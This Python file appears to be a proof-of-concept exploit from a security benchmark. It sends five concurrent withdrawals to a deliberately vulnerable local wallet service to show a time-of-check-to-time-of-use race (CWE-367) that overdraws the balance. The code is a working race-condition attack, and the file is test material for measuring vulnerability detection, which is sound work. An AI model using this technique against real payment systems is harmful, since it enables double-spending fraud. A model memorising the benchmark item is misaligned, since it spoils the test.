"""PoC exploit: TOCTOU race condition in wallet withdrawal (CWE-367).

After the 3-stage chain:
- Stage 1 adds wallet with synchronous balance check + deduction
- Stage 2 adds idempotency key guard
- Stage 3 moves deduction to background thread — TOCTOU

The vulnerability: balance check happens in the main thread, but deduction
happens in the background thread after time.sleep(1). Concurrent requests
all see the full balance, all pass the check, and all deduct in parallel.

Attack: Send 5 concurrent withdrawals of 5000 from a 10000 balance.
Expected: only 2 should succeed (10000 / 5000 = 2)
Actual: all 5 pass the check, total withdrawn = 25000 > balance
"""

import time

from benchmark.chains.poc_templates import ReplayRaceTemplate


class CheckoutRaceExploit(ReplayRaceTemplate):
    """TOCTOU race: concurrent withdrawals bypass balance check."""

    def __init__(self, base_url: str = "http://localhost:4242"):
        super().__init__(base_url)

    @property
    def chain_id(self) -> str:
        return "stripe_checkout_race"

    def setup(self) -> None:
        """Verify wallet exists and has expected balance."""
        resp = self.http_get("/wallet/user_default")
        if not resp.ok:
            # Wallet endpoint may not exist yet
            pass

    def execute(self) -> tuple[bool, str]:
        """Send concurrent withdrawals and check for overdraw."""

        # First check initial balance
        balance_resp = self.http_get("/wallet/user_default")
        if not balance_resp.ok:
            return False, (
                f"GET /wallet/user_default returned {balance_resp.status_code}. "
                f"Wallet endpoint may not be implemented."
            )

        initial_balance = balance_resp.json().get("balance", 0)
        if initial_balance <= 0:
            return False, f"Wallet has zero or negative balance: {initial_balance}"

        withdrawal_amount = initial_balance // 2  # Each request tries to take half
        num_concurrent = 5  # 5 x half = 2.5x the balance

        def send_withdrawal(idx: int):
            return self.http_post(
                "/wallet/withdraw",
                json={
                    "user_id": "user_default",
                    "amount": withdrawal_amount,
                },
                headers={"Content-Type": "application/json"},
            )

        results, errors = self.concurrent(num_concurrent, send_withdrawal)

        if errors:
            return False, f"HTTP errors during concurrent requests: {errors}"

        # Wait for background threads to complete
        time.sleep(3)

        # Check the wallet balance
        final_resp = self.http_get("/wallet/user_default")
        if not final_resp.ok:
            return False, f"GET /wallet/user_default failed: {final_resp.status_code}"

        final_balance = final_resp.json().get("balance", 0)

        # Count successful withdrawals
        success_count = sum(1 for r in results if r and r.ok)
        processing_count = sum(
            1 for r in results
            if r and r.ok and "processing" in r.text
        )

        # Check withdrawals log
        log_resp = self.http_get("/wallet/user_default/withdrawals")
        log_count = 0
        total_withdrawn = 0
        if log_resp.ok:
            try:
                logs = log_resp.json()
                if isinstance(logs, list):
                    log_count = len(logs)
                    total_withdrawn = sum(entry.get("amount", 0) for entry in logs)
            except Exception:
                pass

        evidence_parts = [
            f"Initial balance: {initial_balance}.",
            f"Sent {num_concurrent} concurrent withdrawals of {withdrawal_amount} each.",
            f"Withdrawal responses: {success_count} accepted ({processing_count} processing).",
            f"Final balance: {final_balance}.",
            f"Withdrawal log: {log_count} entries, total withdrawn: {total_withdrawn}.",
        ]

        # Overdraw detected if final balance < 0 or total withdrawn > initial
        if final_balance < 0 or total_withdrawn > initial_balance:
            return True, (
                f"TOCTOU race confirmed (CWE-367). "
                f"Overdraw detected: final_balance={final_balance} "
                f"(initial={initial_balance}), total_withdrawn={total_withdrawn}. "
                f"The balance check runs in the main thread but deduction happens "
                f"in a background thread. Concurrent requests all pass the check "
                f"before any deduction occurs. "
                + " ".join(evidence_parts)
            )

        # Check if more withdrawals succeeded than should have been possible
        max_possible = initial_balance // withdrawal_amount
        if success_count > max_possible:
            return True, (
                f"TOCTOU race confirmed (CWE-367). "
                f"{success_count} withdrawals accepted but only {max_possible} "
                f"should have been possible with balance {initial_balance}. "
                + " ".join(evidence_parts)
            )

        return False, (
            f"No overdraw detected. "
            + " ".join(evidence_parts)
        )
